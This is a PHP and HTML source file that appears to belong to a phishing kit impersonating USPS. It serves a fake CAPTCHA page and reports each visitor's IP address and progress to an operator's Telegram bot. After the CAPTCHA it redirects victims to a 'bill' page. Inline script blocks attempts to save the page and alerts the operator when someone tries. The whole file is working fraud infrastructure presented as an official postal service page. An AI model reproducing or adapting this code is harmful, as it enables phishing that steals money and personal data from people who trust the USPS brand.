<?php
session_start();
include 'config.php';
function getUserIP() {
    $ip = '';
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } 
    elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } 
    else {
        $ip = $_SERVER['REMOTE_ADDR'];
    }
    return $ip;
}
$userIP = getUserIP();
if (!isset($_SESSION['notification_sent'])) {
    $message = urlencode("[+] Visited on: ".date("Y-m-d H:i:s").", IP: ".$userIP." , status : Captcha Page");
    $url = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatID&text=$message";
    $curl = curl_init($url);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($curl, CURLOPT_HEADER, false);
    $response = curl_exec($curl);
    if ($response !== false) {
        $responseData = json_decode($response, true);
        if ($responseData && $responseData['ok']) {
            $_SESSION['message_id'] = $responseData['result']['message_id'];
            $_SESSION['notification_sent'] = true;
        }
    } else {
        echo "cURL Error: " . curl_error($curl);
    }
    curl_close($curl);
}

function generateRandomString($length = 6) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, strlen($characters) - 1)];
    }
    return $randomString;
}
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['userInput'])) {
    if (!isset($_SESSION['captcha_tries'])) {
        $_SESSION['captcha_tries'] = 0;
    }
    if ($_SESSION['captcha_tries'] < 5) {
        $userInput = $_POST['userInput'];
        if (strtolower($userInput) === strtolower($_SESSION['captcha'])) {
            // CAPTCHA verification successful
            if (isset($_SESSION['message_id'])) {
                $messageId = $_SESSION['message_id'];
                $message = "[+] Visited on: ".date("Y-m-d H:i:s").", IP: ".$userIP." , status : Moving To Bill Page";
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot".$botToken."/editMessageText");
                curl_setopt($ch, CURLOPT_POST, true);
                curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query(['chat_id' => $chatID, 'message_id' => $messageId, 'text' => $message]));
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                $response = curl_exec($ch);
                curl_close($ch);
                $responseData = json_decode($response, true);
                if ($responseData && $responseData['ok']) {
                    header("Location: bill.php");
                    exit;
                }
            }
        } else {
            $verificationResult = "Incorrect CAPTCHA. Please try again.";
            $_SESSION['captcha_tries']++;
        }
    } else {
        $verificationResult = "Rate limit exceeded. Please wait before trying again.";
    }
    $_SESSION['captcha'] = generateRandomString(); // Refresh CAPTCHA after each attempt
} else {
    if (!isset($_SESSION['captcha']) || !isset($_SESSION['captcha_tries'])) {
        $_SESSION['captcha'] = generateRandomString();
        $_SESSION['captcha_tries'] = 0;
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>USPS CAPTCHA Verification</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="captcha-container">
        <img src="https://i0.wp.com/mailomg.com/wp-content/uploads/2017/09/usps_eagle-symbol.png?resize=300%2C253&ssl=1" alt="USPS Logo" class="usps-logo">
        <p>Please complete the CAPTCHA to proceed to the main page.</p>
        <?php if (isset($verificationResult)) echo "<p class='result'>$verificationResult</p>"; ?>
        <form action="" method="post">
            <img src="captcha_image.php" alt="CAPTCHA" class="captcha-image"/>
            <input type="text" name="userInput" placeholder="Enter CAPTCHA" required>
            <button type="submit">Verify</button>
        </form>
    </div>
    <script>
        document.addEventListener('keydown', function(event) {
            if ((event.ctrlKey || event.metaKey) && event.key === 's') {
                event.preventDefault();
                document.body.innerHTML = 'EZEBBBBY habeb tsajel l page ?';
                var formData = new FormData();
                formData.append('action', 'notify');
                fetch('zebu_alert.php', {method: 'POST',body: formData})
                .then(response => response.text())
                .then(result => {
                    console.log(result);
                    if (result.includes("Notification sent successfully")) {
                        window.location.href = window.location.href;
                    } 
                })
                .catch(error => console.error('Error:', error));
            }
        });
    </script>
</body>
</html>
